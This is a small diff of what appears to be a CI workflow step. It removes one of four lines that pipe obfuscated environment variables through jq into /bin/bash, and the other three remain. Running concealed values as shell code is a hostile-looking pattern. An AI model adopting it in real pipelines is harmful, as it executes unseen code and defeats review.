@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$fcfn15" | jq -r .nts95600 | /bin/bash
           echo $ote9 | jq -r .qugf414 | /bin/bash
-          echo $lxxjj7 | jq -r .tssyb3 | /bin/bash
           echo $ox20941 | jq -r .fqzip77 | /bin/bash
 
       - name: Archive results
